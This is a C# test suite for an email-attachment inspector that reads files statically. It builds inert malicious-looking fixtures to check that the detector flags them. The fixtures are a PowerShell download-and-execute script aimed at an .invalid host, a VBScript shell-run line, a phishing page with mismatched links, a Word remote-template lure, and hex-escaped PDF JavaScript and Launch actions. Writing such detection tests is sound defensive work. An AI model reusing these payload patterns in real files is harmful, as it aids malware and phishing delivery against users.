using System.IO.Compression;
using System.Reflection;
using System.Text;
using OpenMcdf;
using OnlyWorkspace.Core.Security;
using OnlyWorkspace.Infrastructure.Security;

namespace OnlyWorkspace.Tests;

/// <summary>
/// The extractor's security mode through the real helper process. Fixtures are inert text built at run time
/// (hosts .invalid, commands assembled from parts): nothing is executed or fetched.
/// </summary>
public class AttachmentInspectionTests
{
    private static string J(params string[] parts) => string.Concat(parts);
    private static readonly string Iex = J("Invoke-", "Expression");
    private static readonly string Iwr = J("Invoke-", "WebRequest");
    private static string RiskyScript => "$r = " + Iwr + " -Uri https://example.invalid/a -UseBasicParsing\n" + Iex + " $r.Content\n";
    private const string Page = "<html><body><form action=\"https://login.example.invalid/p\"><input type=\"password\"></form>" +
                                "<a href=\"https://evil.example.invalid/x\">www.banca.it</a></body></html>";

    private static async Task<AttachmentInspection> InspectAsync(string fileName, byte[] content, bool damaged = false)
    {
        var artifacts = Environment.GetEnvironmentVariable("ONLYWORKSPACE_TEST_ARTIFACTS");
        var dir = Directory.CreateDirectory(Path.Combine(artifacts ?? Path.GetTempPath(), "ow-test-" + Guid.NewGuid().ToString("N"))).FullName;
        try
        {
            var path = Path.Combine(dir, fileName);
            File.WriteAllBytes(path, content);
            var result = await AttachmentTextExtractor.InspectAsync(path, TimeSpan.FromSeconds(60), CancellationToken.None);
            if (damaged) Assert.NotNull(result.Error); else Assert.Null(result.Error);
            Assert.Single(Directory.GetFiles(dir)); // nothing left behind
            return result;
        }
        finally
        {
            if (artifacts == null) TestArtifacts.DeleteDirectory(dir, recursive: true);
        }
    }

    private static byte[] Utf8(string text) => new UTF8Encoding(false).GetBytes(text);

    private static byte[] ZipOf(params (string Name, byte[] Content)[] entries)
    {
        using var memory = new MemoryStream();
        using (var zip = new ZipArchive(memory, ZipArchiveMode.Create, leaveOpen: true))
            foreach (var (name, content) in entries)
                using (var stream = zip.CreateEntry(name).Open()) stream.Write(content, 0, content.Length);
        return memory.ToArray();
    }

    [Fact]
    public async Task ScriptAttachment_IsReadStatically()
    {
        var result = await InspectAsync("avvio.ps1", Utf8(RiskyScript));
        Assert.Equal("script", result.Format);
        var finding = Assert.Single(result.Findings, f => f.Rule == "script.download-exec");
        Assert.Equal(string.Empty, finding.File);
        Assert.Equal(2, finding.Line);
        Assert.True(result.Inspected > 0);
    }

    [Fact]
    public async Task ScriptsAndPagesInsideAZip_AreAttributedToTheirFile()
    {
        var result = await InspectAsync("pacchetto.zip", ZipOf(("avvio.ps1", Utf8(RiskyScript)), ("modulo.html", Utf8(Page)), ("nota.txt", Utf8("Vedi https://docs.example.invalid/guida"))));
        Assert.Contains(result.Findings, f => f.Rule == "script.download-exec" && f.File == "avvio.ps1");
        Assert.Contains(result.Findings, f => f.Rule == "html.password-external" && f.File == "modulo.html");
        Assert.Contains(result.Links, l => l.File == "modulo.html" && l.Text == "www.banca.it" && l.Destination == "https://evil.example.invalid/x");
        Assert.Contains(result.Links, l => l.Destination == "https://docs.example.invalid/guida");
        Assert.DoesNotContain(result.Links, l => l.Destination == "https://www.banca.it");
    }

    [Fact]
    public async Task AttachedEmail_GivesItsBodyLinksAndItsAttachmentsReading()
    {
        var message = new MimeKit.MimeMessage();
        message.From.Add(new MimeKit.MailboxAddress("Mario", "mario@example.invalid"));
        message.Subject = "Inoltro";
        var builder = new MimeKit.BodyBuilder { HtmlBody = "<p>Apri <a href=\"https://evil.example.invalid/\">https://www.contoso.com</a></p>" };
        builder.Attachments.Add("script.vbs", Utf8(J("CreateObject(\"WScript.", "Shell\").Run \"cmd /c calc\", 0\n")));
        message.Body = builder.ToMessageBody();
        using var memory = new MemoryStream();
        message.WriteTo(memory);

        var result = await InspectAsync("inoltro.eml", memory.ToArray());
        Assert.Contains(result.Links, l => l.Text == "https://www.contoso.com" && l.Destination == "https://evil.example.invalid/");
        Assert.Contains(result.Findings, f => f.Rule == "script.hidden-exec" && f.File == "script.vbs");
    }

    [Theory]
    [InlineData(".com", "https://other.example.com")]
    [InlineData("login", "https://other.example.invalid/login")]
    [InlineData("www.contoso.com", "https://xwww.contoso.com")]
    public async Task WrittenLinkIsNotHiddenByAStructuredLinksTextSuffix(string label, string written)
    {
        var result = await InspectAsync("link.html", Utf8($"<html><body><a href='https://target.example.invalid/'>{label}</a><p>{written}</p></body></html>"));
        Assert.Contains(result.Links, l => l.Text == label && l.Destination == "https://target.example.invalid/");
        Assert.Contains(result.Links, l => l.Text.Length == 0 && l.Destination == written);
    }

    [Theory]
    [InlineData("www.contoso.com")]
    [InlineData("https://www.contoso.com")]
    [InlineData("HTTPS://www.contoso.com")]
    public async Task FullVisibleAddressIsNotReportedAsAnIndependentLink(string label)
    {
        var result = await InspectAsync("link.html", Utf8($"<a href='https://target.example.invalid/'>{label}</a>"));
        Assert.Single(result.Links);
    }

    [Fact]
    public async Task ReadingFailureRetainsKnownFormatAndMacros()
    {
        var path = Path.Combine(Path.GetTempPath(), "ow-test-" + Guid.NewGuid().ToString("N") + ".doc");
        try
        {
            using (var root = RootStorage.Create(path))
            {
                root.CreateStorage("VBA");
                using var document = root.CreateStream("WordDocument");
                document.WriteByte(0); // Truncated FIB: macro detection succeeds, then the text read fails.
            }
            var result = await InspectAsync("broken.doc", File.ReadAllBytes(path), damaged: true);
            Assert.Equal("ole", result.Format);
            Assert.True(result.HasMacros);
            Assert.Equal(0, result.Inspected);
        }
        finally { TestArtifacts.DeleteFile(path); }
    }

    [Fact]
    public async Task SignedScript_IsUnwrappedAndRead()
    {
        var result = await InspectAsync("avvio.ps1.p7m", AttachmentExtractionTests.Signed(Utf8(RiskyScript)));
        Assert.Contains(result.Findings, f => f.Rule == "script.download-exec");
    }

    [Fact]
    public async Task WordHyperlinkAndRemoteTemplate_AreReported()
    {
        const string w = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
        string rels = AttachmentExtractionTests.OfficeRels;
        var docx = AttachmentExtractionTests.Zip(
            AttachmentExtractionTests.ContentTypes(("/word/document.xml", "wordprocessingml.document.main+xml"), ("/word/settings.xml", "wordprocessingml.settings+xml")),
            AttachmentExtractionTests.Rels("_rels/.rels", ("officeDocument", "word/document.xml")),
            ("word/_rels/document.xml.rels", "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
                $"<Relationship Id=\"rId1\" Type=\"{rels}/hyperlink\" Target=\"https://evil.example.invalid/login\" TargetMode=\"External\"/>" +
                $"<Relationship Id=\"rId2\" Type=\"{rels}/settings\" Target=\"settings.xml\"/></Relationships>"),
            ("word/_rels/settings.xml.rels", "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
                $"<Relationship Id=\"rId9\" Type=\"{rels}/attachedTemplate\" Target=\"https://templates.example.invalid/t.dotm\" TargetMode=\"External\"/></Relationships>"),
            ("word/settings.xml", $"<w:settings xmlns:w=\"{w}\" xmlns:r=\"{rels}\"><w:attachedTemplate r:id=\"rId9\"/></w:settings>"),
            ("word/document.xml", $"<w:document xmlns:w=\"{w}\" xmlns:r=\"{rels}\"><w:body><w:p><w:hyperlink r:id=\"rId1\"><w:r><w:t>www.contoso.com</w:t></w:r></w:hyperlink></w:p></w:body></w:document>"));

        var result = await InspectAsync("offerta.docx", docx);
        Assert.Contains(result.Links, l => l.Text == "www.contoso.com" && l.Destination == "https://evil.example.invalid/login");
        Assert.Contains(result.Findings, f => f.Rule == "ooxml.remote-template");
    }

    [Fact]
    public async Task PdfActionNames_AreReported_ButLongerNamesAreNot()
    {
        // Hand-written, unparseable PDFs: the action names are found before the reader fails, and the failure is declared.
        var pdf = Encoding.ASCII.GetBytes("%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF");
        var result = await InspectAsync("modulo.pdf", pdf, damaged: true);
        Assert.Equal("pdf", result.Format);
        Assert.Contains(result.Findings, f => f.Rule == "pdf.javascript");
        Assert.DoesNotContain(result.Findings, f => f.Rule == "pdf.launch");

        var json = await InspectAsync("dati.pdf", Encoding.ASCII.GetBytes("%PDF-1.4\n1 0 obj << /Type /Catalog /JSONData 1 >> endobj\n%%EOF"), damaged: true);
        Assert.DoesNotContain(json.Findings, f => f.Rule == "pdf.javascript");
    }

    private static byte[] ActionPdf(string catalogEntries) => new PdfLayoutExtractionTests.MiniPdf()
        .Text(50, 700, "Documento sintetico per la lettura statica delle azioni PDF.")
        .Build(catalogEntries);

    [Theory]
    [InlineData("/OpenAction << /S /JavaScript /JS (void 0;) >>", "pdf.javascript")]
    [InlineData("/#4fpen#41ction << /S /J#61vaScript /J#53 (void 0;) >>", "pdf.javascript")]
    [InlineData("/#4FpenAction << /S /#4a#61#76#61#53#63#72#69#70#74 /#4A#53 (void 0;) >>", "pdf.javascript")]
    [InlineData("/OpenAction << /S /Launch /F (onlyworkspace-fixture.invalid) >>", "pdf.launch")]
    [InlineData("/#4fpenAction << /S /L#61unch /F (onlyworkspace-fixture.invalid) >>", "pdf.launch")]
    [InlineData("/#4FpenAction << /S /#4c#61#75#6e#63#68 /F (onlyworkspace-fixture.invalid) >>", "pdf.launch")]
    public async Task PdfEscapedActionNames_AreReportedThroughTheHelper(string entries, string rule)
    {
        var result = await InspectAsync("azioni.pdf", ActionPdf(entries));
        Assert.Equal("pdf", result.Format);
        Assert.Null(result.Problem);
        Assert.False(result.Truncated);
        Assert.Equal(rule, Assert.Single(result.Findings).Rule);
    }

    [Theory]
    [InlineData("/J#53")]
    [InlineData("/#4aS")]
    [InlineData("/#4A#53")]
    public async Task PdfEscapedShortJavaScriptName_IsRecognizedIndependently(string name)
    {
        var result = await InspectAsync("nome.pdf", ActionPdf($"/OnlyWorkspaceProbe << {name} (void 0;) >>"));
        Assert.Equal("pdf.javascript", Assert.Single(result.Findings).Rule);
    }

    [Theory]
    [InlineData("/JSONData /J#53ONData /JS_ /JavaScript.More /Launch-File")]
    [InlineData("/JS#2f /JavaScript#20 /Launch#23 /J#53#2FLaunch")]
    [InlineData("/J#2353 /Java#2353cript /#2FLaunch")]
    [InlineData("/JavaScript#GG /JS#5 /Launch#")]
    [InlineData("/Javascript /js /launch")]
    public async Task PdfNames_AreComparedAsWholeDecodedCaseSensitiveTokens(string names)
    {
        var result = await InspectAsync("nomi.pdf", ActionPdf($"/OnlyWorkspaceProbe [{names}]"));
        Assert.Empty(result.Findings);
    }

    [Fact]
    public async Task PdfEscapedOpenAction_WithOnlyAnInternalDestination_HasNoActiveFinding()
    {
        // OpenAction may simply select a page; its presence alone is not JavaScript or Launch.
        var result = await InspectAsync("destinazione.pdf", ActionPdf("/#4fpen#41ction << /S /GoTo /D [4 0 R /Fit] >>"));
        Assert.Empty(result.Findings);
    }

    [Fact]
    public async Task PdfEscapedActionInsideAZip_RetainsItsFileAttribution()
    {
        var result = await InspectAsync("documenti.zip", ZipOf(("azioni.pdf",
            ActionPdf("/#4fpenAction << /S /L#61unch /F (onlyworkspace-fixture.invalid) >>"))));
        var finding = Assert.Single(result.Findings);
        Assert.Equal("pdf.launch", finding.Rule);
        Assert.Equal("azioni.pdf", finding.File);
    }

    [Fact]
    public async Task ProgramInsideAZip_IsALimit_NotADiagnosis()
    {
        var exe = new byte[64];
        exe[0] = 0x4D; exe[1] = 0x5A;
        var result = await InspectAsync("strumenti.zip", ZipOf(("setup.exe", exe)));
        Assert.Contains(result.Limits, l => l.File == "setup.exe" && l.Reason == "binary-program");
        Assert.Empty(result.Findings);
        Assert.Contains(result.Entries, e => e.File == "setup.exe" && e.DetectedType == "exe");
    }

    [Fact]
    public async Task FilesInsideAContainer_AreListedByName()
    {
        var result = await InspectAsync("pacchetto.zip", ZipOf(("leggimi.txt", Utf8("ciao")), ("interno.zip", ZipOf(("avvio.lnk", Utf8("x"))))));
        Assert.Contains(result.Entries, e => e.File == "leggimi.txt");
        Assert.Contains(result.Entries, e => e.File == "interno.zip › avvio.lnk");
        Assert.DoesNotContain(result.Entries, e => e.File.Length == 0);
    }

    [Fact]
    public async Task NestingBeyondTheDepthLimit_IsDeclared()
    {
        var inner = ZipOf(("terzo.zip", ZipOf(("avvio.ps1", Utf8(RiskyScript)))));
        var result = await InspectAsync("primo.zip", ZipOf(("secondo.zip", inner)));
        Assert.True(result.Truncated);
    }

    [Fact]
    public async Task OrdinaryDocument_HasNoFindings()
    {
        var result = await InspectAsync("nota.txt", Utf8("Riunione giovedì alle 10. Ordine del giorno allegato."));
        Assert.Empty(result.Findings);
        Assert.Empty(result.Links);
        Assert.True(result.Inspected > 0);
    }

    /// <summary>The static reading cannot reach the network: the helper references no networking type.</summary>
    [Fact]
    public void Helper_ReferencesNoNetworkApi()
    {
        var helper = AttachmentTextExtractor.FindHelper();
        Assert.NotNull(helper);
        var assemblies = new[] { helper!, Path.Combine(Path.GetDirectoryName(helper)!, "OnlyWorkspace.Core.dll") };
        foreach (var path in assemblies)
        {
            var names = Assembly.Load(File.ReadAllBytes(path)).GetReferencedAssemblies().Select(a => a.Name).ToList();
            Assert.DoesNotContain(names, n => n is "System.Net.Http" or "System.Net.Requests" or "System.Net.Sockets" or "System.Net.WebClient");
        }
        var metadata = File.ReadAllText(helper!, Encoding.ASCII);
        foreach (var api in new[] { "WebClient", "HttpClient", "WebRequest", "TcpClient", "Socket" })
            Assert.DoesNotContain(api, metadata);
    }
}
